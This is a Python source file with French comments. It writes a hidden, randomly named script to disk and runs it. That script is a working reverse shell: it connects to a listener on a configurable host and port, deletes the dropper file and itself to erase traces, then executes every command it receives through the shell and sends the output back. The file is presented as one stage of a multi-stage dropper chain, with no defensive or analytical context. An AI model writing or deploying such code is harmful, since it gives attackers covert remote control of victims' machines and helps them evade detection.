import subprocess  # Importation de la bibliotheque subprocess pour executer des commandes systeme
import os          # Importation de la bibliotheque os pour effectuer des operations sur le systeme de fichiers

def generer_script_modele(nom_fichier):
    # Definition du script modele qui sera enregistre dans un fichier Python
    script_modele = """
import __main__
import os          # Importation de la bibliotheque os pour effectuer des operations sur le systeme de fichiers
import socket      # Importation de la bibliotheque socket pour gerer les connexions reseau
import subprocess  # Importation de la bibliotheque subprocess pour executer des commandes systeme

# Fonction pour se connecter a un serveur distant via une connexion reseau
def se_connecter_au_listener(serveur, port):
    try:
        # Creation d'une socket pour la communication (IPv4, TCP)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connexion au serveur distant via l'adresse IP et le port specifies
        s.connect((serveur, port))
        
        # Retour de la socket connectee
        return s
    except Exception as e:
        # En cas d'erreur de connexion au serveur, affiche un message d'erreur et quitte le programme
        print(f"[!] {os.path.basename(__main__.__file__)} => Erreur lors de la connexion au serveur : {e}")
        exit(0)

# Fonction principale du script
def main():
    serveur = "127.0.0.1"      # Adresse IP du serveur distant
    port = 1234                     # Port de connexion sur le serveur distant
    
    # Obtention du repertoire actuel ou le script est execute
    dossier_courant = os.getcwd()
    
    # Partie du nom du 'modele desobfusque' generer dans deobfuscate.py
    partie_du_nom = "zit"  

    # Parcourez les fichiers dans le repertoire
    for fichier in os.listdir(dossier_courant):
        if partie_du_nom in fichier:
            nom_modele_desobfusque = os.path.join(dossier_courant, fichier)

    dropper = os.path.basename(nom_modele_desobfusque)
    payload = os.path.basename(__main__.__file__) # Obtenir le nom du modele en cours d'execution
    
    # Appel de la fonction pour etablir une connexion au serveur
    s = se_connecter_au_listener(serveur, port)
    
    try:
        
        # Affiche les noms de fichiers et les supprimes
        s.send(f"[+] Le fichier '{dropper}' a executer '{payload}'".encode("utf-8"))
        
        os.remove(dropper) # modele_desobfusque
        os.remove(payload) # modele
        
        while True:
            # Reception de commandes du serveur et decryptage en UTF-8
            commande = s.recv(1024).decode("utf-8", errors="replace")
            
            if commande.startswith("cd "):
                # Si la commande commence par "cd ", cela indique un changement de repertoire
                nouveau_dossier = commande[3:].strip()
                try:
                    # Changement de repertoire local
                    os.chdir(nouveau_dossier)
                    dossier_courant = os.getcwd()
                except Exception as e:
                    # En cas d'erreur lors du changement de repertoire, envoie un message d'erreur au serveur
                    s.send(f"[!] {os.path.basename(__main__.__file__)} => Erreur lors du changement de repertoire : {str(e)}".encode("utf-8"))
            else:
                # Si la commande n'est pas un changement de repertoire, elle est executee localement
                resultat = subprocess.Popen(commande, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                
                # Capture de la sortie de la commande
                sortie = resultat.stdout.read() + resultat.stderr.read()
                
                # Envoi de la sortie au serveur
                s.send(sortie)
            
            # Envoi du chemin du dossier courant au serveur pour la prochaine commande
            s.send(f"[+] {dossier_courant} => ".encode("utf-8"))
    except Exception as e:
        # En cas d'erreur de communication avec le serveur, affiche un message d'erreur
        print(f"[!] {os.path.basename(__main__.__file__)} => Erreur dans la communication avec le serveur : {e}")
    finally:
        # Fermeture de la connexion reseau
        s.close()

if __name__ == "__main__":
    # Appel de la fonction principale du script lors de son execution
    main()
"""
    try:
        # Generation d'un nom de fichier pour le modele avec une extension .py (evite d'utilise import UUDI)
        def generer_aleatoire(longueur):
            alphabet = 'abcdefghijklmnopqrstuvwxyz'
            gen = ''
            for i in range(longueur):
                index = ord(os.urandom(1)) % len(alphabet)
                gen += alphabet[index]
            return gen
        
        nom_aleatoire = str(generer_aleatoire(10))
        nom = str(nom_aleatoire + ".py")
        
        # Obtention du repertoire actuel ou le script est execute
        dossier_courant = os.getcwd()
        
        # Chemin complet du fichier de sortie dans le repertoire courant
        nom_modele = os.path.join(dossier_courant, nom)
        
        # Enregistrement du script modele dans le fichier de sortie
        with open(nom_modele, 'w', encoding="utf-8") as fichier_sortie:
            fichier_sortie.write(script_modele)
        print(f"\n[+] Le 'modele' a ete enregistre dans '{nom_modele}'.\n")

    except Exception as e:
        # En cas d'erreur lors de l'enregistrement, affiche un message d'erreur
        print(f"\n[!] Une erreur s'est produite lors de l'enregistrement du modele '{nom_modele}' : {str(e)}")
    
    try:
        if os.name == 'nt':
            # Rendre le fichier cache en modifiant ses attributs
            os.system(f'attrib +h {nom}')
            # Execution du script Python sous Windows
            subprocess.run(["python", nom_modele], check=True)
        elif os.name == 'posix':
            # Execution du script Python sous Unix/Linux
            subprocess.run(["python3", nom_modele], check=True)
        else:
            # Si le systeme d'exploitation n'est pas reconnu, affiche un message
            print("[!] Le systeme d'exploitation n'est pas reconnu.")
    except subprocess.CalledProcessError as e:
        # En cas d'erreur lors de l'execution du script, affiche un message d'erreur
        print(f"\n[!] Erreur lors de l'execution du script : {e}")
        os.remove(nom) # payload
        
        # Partie du nom du 'modele desobfusque' generer dans deobfuscate.py
        partie_du_nom = "zit"  

        # Parcoure les fichiers dans le repertoire
        for fichier in os.listdir(dossier_courant):
            if partie_du_nom in fichier:
                nom_modele_desobfusque = os.path.join(dossier_courant, fichier)
                os.remove(nom_modele_desobfusque) 
        

if __name__ == "__main__":
    # Appel de la fonction principale pour generer et executer le script modele
    generer_script_modele("modele.py") # nom sans importance
